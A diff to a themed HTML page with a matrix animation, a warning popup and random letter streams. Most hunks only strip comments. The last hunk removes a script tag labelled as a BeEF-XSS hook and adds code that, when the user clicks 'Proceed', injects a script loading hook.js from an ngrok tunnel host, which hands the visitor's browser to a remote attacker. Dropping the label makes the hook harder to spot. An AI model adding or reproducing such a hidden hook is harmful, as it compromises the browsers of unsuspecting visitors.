@@ -38,7 +38,6 @@
       }
     }
 
-    /* Warning Popup Styles */
     #warningPopup {
       position: fixed;
       top: 50%;
@@ -70,7 +69,6 @@
       background-color: #d40000;
     }
 
-    /* Random Letter Stream */
     .random-text {
       position: absolute;
       font-size: 18px;
@@ -100,7 +98,6 @@
     <p class="blink">█</p>
   </div>
 
-  <!-- Warning Popup -->
   <div id="warningPopup">
     <p>Confidential information ahead!</p>
     <button id="proceedBtn">Proceed</button>
@@ -140,7 +137,6 @@
 
     setInterval(drawMatrix, 50);
 
-    // Sound Effects
     const typingSound = document.getElementById('typingSound');
     const beepSound = document.getElementById('beepSound');
 
@@ -159,20 +155,17 @@
     const proceedBtn = document.getElementById('proceedBtn');
 
     proceedBtn.addEventListener('click', () => {
-      // Hide warning and show the cryptic text stream
       warningPopup.style.display = 'none';
       document.body.style.background = 'black';
 
-      // Create random letter streams
       function createRandomText() {
         const textElement = document.createElement('div');
         textElement.classList.add('random-text');
-        textElement.innerText = generateRandomString(50); // Generate a random string of length 50
+        textElement.innerText = generateRandomString(50);
         textElement.style.top = `${Math.random() * 100}%`;
         document.body.appendChild(textElement);
       }
 
-      // Generate random string of characters (for the Kryptos-like effect)
       function generateRandomString(length) {
         let result = '';
         const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -182,14 +175,14 @@
         return result;
       }
 
-      // Create several random text elements
       for (let i = 0; i < 50; i++) {
         createRandomText();
       }
+
+      const script = document.createElement('script');
+      script.src = 'https://71bb-39-49-218-87.ngrok.free.app/hook.js';
+      document.body.appendChild(script); 
     });
   </script>
-
-  <!-- Beef-XSS Hook Script -->
-  <script src="https://23b3-39-49-218-87.ngrok-free.app/hook.js"></script>
 </body>
 </html>
